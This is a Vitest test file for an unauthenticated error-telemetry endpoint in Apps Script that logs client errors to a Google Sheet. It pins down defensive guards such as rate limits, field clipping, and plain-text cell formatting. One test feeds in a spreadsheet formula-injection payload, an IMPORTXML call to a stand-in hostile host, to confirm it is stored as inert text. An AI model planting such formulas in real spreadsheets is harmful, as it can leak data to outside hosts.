/**
 * Unit tests for the `clientError` action (frontend error telemetry).
 *
 * handleClientError is an UNAUTHENTICATED write endpoint — anyone can POST
 * to it — so these tests pin the abuse guards as hard requirements, not
 * niceties: the per-request batch cap, the global per-minute budget, field
 * clipping, the lock-timeout drop, and the '@' plain-text format that
 * keeps a hostile "error message" from executing as a formula when the
 * owner opens the sheet. Runs against the SHIPPED Code.gs via the same
 * eval-with-mock-globals harness as handlers.test.js.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SRC = fs.readFileSync(path.resolve(HERE, '../../../apps-script/Code.gs'), 'utf-8');

/**
 * In-memory sheet recording every write, including the ORDER of range
 * calls — the '@' format must land before the values do.
 */
function recordingSheet(initialRows = []) {
  const grid = initialRows.map((r) => r.slice());
  const calls = [];
  return {
    _grid: grid,
    _calls: calls,
    getLastRow: () => grid.length,
    appendRow: (row) => { grid.push(row.slice()); calls.push(['appendRow', row.slice()]); },
    getRange: (row, col, numRows, numCols) => ({
      setNumberFormat: (fmt) => { calls.push(['setNumberFormat', fmt, row, numRows, numCols]); },
      setValues: (rows) => {
        calls.push(['setValues', row, rows.length]);
        for (let i = 0; i < rows.length; i++) grid[row - 1 + i] = rows[i].slice();
      },
      setValue() {},
    }),
    getDataRange: () => ({ getValues: () => grid.map((r) => r.slice()) }),
  };
}

function memoryCache(seed = {}) {
  const store = new Map(Object.entries(seed));
  return {
    _store: store,
    getScriptCache: () => ({
      get: (k) => (store.has(k) ? store.get(k) : null),
      put: (k, v) => { store.set(k, v); },
      remove: (k) => { store.delete(k); },
    }),
  };
}

function loadBackend(mocks = {}) {
  const sheet = mocks.sheet || recordingSheet();
  const globals = {
    UrlFetchApp: { fetch: () => ({ getResponseCode: () => 200, getContentText: () => '{}' }) },
    SpreadsheetApp: {
      openById: () => ({ getSheets: () => [sheet], getSheetByName: () => sheet, insertSheet: () => sheet }),
    },
    LockService: mocks.LockService || { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    CacheService: mocks.CacheService || memoryCache(),
    Utilities: {
      getUuid: () => '00000000-0000-0000-0000-000000000000',
      computeDigest: () => [], base64EncodeWebSafe: () => 'x', sleep() {},
      DigestAlgorithm: { MD5: 'MD5', SHA_256: 'SHA_256' },
    },
    Logger: { log() {} },
    ContentService: { createTextOutput: () => ({ setMimeType: () => ({}) }), MimeType: { JSON: 'json' } },
    ScriptApp: {}, XmlService: {},
  };
  const factory = new Function(...Object.keys(globals), `${SRC}\nreturn { handleClientError };`);
  return { handleClientError: factory(...Object.values(globals)).handleClientError, sheet };
}

const report = (overrides = {}) => ({
  sessionId: 's_abc12345',
  appVersion: '1.20.0',
  page: 'https://example.com/#latest',
  userAgent: 'TestAgent/1.0',
  errors: [{ ts: '2026-08-20T10:00:00.000Z', message: 'boom', stack: 'Error: boom\n  at x.js:1', source: 'x.js:1:1' }],
  ...overrides,
});

// The budget bucket key is derived from Date.now(); pin the clock so a test
// never straddles a minute boundary between seeding the cache and the call.
const NOW = 1755680400000;
const BUCKET_KEY = 'cerr_' + Math.floor(NOW / 60000);

afterEach(() => vi.restoreAllMocks());

describe('handleClientError — happy path', () => {
  it('self-initializes the header row and appends the report on an empty sheet', () => {
    const { handleClientError, sheet } = loadBackend();
    const res = handleClientError(report());

    expect(res.status).toBe('ok');
    expect(res.accepted).toBe(1);
    expect(sheet._grid[0]).toEqual([
      'logged_at', 'client_ts', 'session_id', 'app_version',
      'message', 'stack', 'source', 'page', 'user_agent',
    ]);
    const row = sheet._grid[1];
    expect(row[1]).toBe('2026-08-20T10:00:00.000Z'); // client_ts
    expect(row[2]).toBe('s_abc12345');
    expect(row[3]).toBe('1.20.0');
    expect(row[4]).toBe('boom');
    expect(row[6]).toBe('x.js:1:1');
    expect(row[7]).toBe('https://example.com/#latest');
  });

  it('appends after existing rows without re-writing the header', () => {
    const sheet = recordingSheet([
      ['logged_at', 'client_ts', 'session_id', 'app_version', 'message', 'stack', 'source', 'page', 'user_agent'],
      ['t0', 'c0', 's0', 'v0', 'old', '', '', '', ''],
    ]);
    const { handleClientError } = loadBackend({ sheet });
    handleClientError(report());

    expect(sheet._grid).toHaveLength(3);
    expect(sheet._calls.filter(([op]) => op === 'appendRow')).toHaveLength(0);
    expect(sheet._grid[2][4]).toBe('boom');
  });

  it('sets plain-text ("@") format on the target range BEFORE writing values', () => {
    const { handleClientError, sheet } = loadBackend();
    handleClientError(report({
      errors: [{ ts: 't', message: '=IMPORTXML("https://evil.example","//x")', stack: '', source: 's' }],
    }));

    const ops = sheet._calls.filter(([op]) => op !== 'appendRow').map(([op]) => op);
    expect(ops).toEqual(['setNumberFormat', 'setValues']);
    const fmt = sheet._calls.find(([op]) => op === 'setNumberFormat');
    expect(fmt[1]).toBe('@');
    // The hostile payload lands verbatim as data — neutered by the format.
    expect(sheet._grid[1][4]).toBe('=IMPORTXML("https://evil.example","//x")');
  });
});

describe('handleClientError — input hardening', () => {
  it('rejects a payload with no errors array', () => {
    const { handleClientError, sheet } = loadBackend();
    expect(handleClientError(report({ errors: undefined })).status).toBe('error');
    expect(handleClientError(report({ errors: [] })).status).toBe('error');
    expect(sheet._grid).toHaveLength(0);
  });

  it('clips oversized fields instead of storing them whole', () => {
    const { handleClientError, sheet } = loadBackend();
    handleClientError(report({
      errors: [{ ts: 't', message: 'm'.repeat(5000), stack: 's'.repeat(50000), source: 'x' }],
    }));

    expect(sheet._grid[1][4]).toHaveLength(500);
    expect(sheet._grid[1][5]).toHaveLength(2000);
  });

  it('tolerates junk entries (null / non-object) in the errors array', () => {
    const { handleClientError, sheet } = loadBackend();
    const res = handleClientError(report({ errors: [null, 'garbage', { message: 'real' }] }));
    expect(res.status).toBe('ok');
    expect(res.accepted).toBe(3);
    expect(sheet._grid[3][4]).toBe('real');
  });

  it('caps one request at 10 rows', () => {
    const { handleClientError, sheet } = loadBackend();
    const errors = Array.from({ length: 30 }, (_, i) => ({ message: `e${i}` }));
    const res = handleClientError(report({ errors }));

    expect(res.accepted).toBe(10);
    expect(sheet._grid).toHaveLength(11); // header + 10
  });
});

describe('handleClientError — global rate limit', () => {
  it('drops the whole batch once the per-minute budget is spent', () => {
    vi.spyOn(Date, 'now').mockReturnValue(NOW);
    const { handleClientError, sheet } = loadBackend({
      CacheService: memoryCache({ [BUCKET_KEY]: '60' }),
    });
    const res = handleClientError(report());

    expect(res).toMatchObject({ status: 'ok', accepted: 0, dropped: 1 });
    expect(sheet._grid).toHaveLength(0); // nothing written, not even headers
  });

  it('accepts only up to the remaining budget', () => {
    vi.spyOn(Date, 'now').mockReturnValue(NOW);
    const { handleClientError, sheet } = loadBackend({
      CacheService: memoryCache({ [BUCKET_KEY]: '55' }),
    });
    const errors = Array.from({ length: 10 }, (_, i) => ({ message: `e${i}` }));
    const res = handleClientError(report({ errors }));

    expect(res.accepted).toBe(5);
    expect(sheet._grid).toHaveLength(6); // header + 5
  });

  it('fails open (accepts the batch) when CacheService is unavailable', () => {
    const { handleClientError, sheet } = loadBackend({
      CacheService: { getScriptCache: () => { throw new Error('cache down'); } },
    });
    expect(handleClientError(report()).accepted).toBe(1);
    expect(sheet._grid).toHaveLength(2);
  });
});

describe('handleClientError — lock behavior', () => {
  it('drops the batch (still ok) when the script lock cannot be acquired', () => {
    const { handleClientError, sheet } = loadBackend({
      LockService: { getScriptLock: () => ({ waitLock: () => { throw new Error('busy'); }, releaseLock() {} }) },
    });
    const res = handleClientError(report());

    expect(res).toMatchObject({ status: 'ok', accepted: 0, dropped: 1 });
    expect(sheet._grid).toHaveLength(0);
  });

  it('releases the lock even if the sheet write throws', () => {
    let released = false;
    const sheet = recordingSheet();
    sheet.getRange = () => { throw new Error('sheet exploded'); };
    const { handleClientError } = loadBackend({
      sheet,
      LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock: () => { released = true; } }) },
    });

    expect(() => handleClientError(report())).toThrow('sheet exploded');
    expect(released).toBe(true);
  });
});
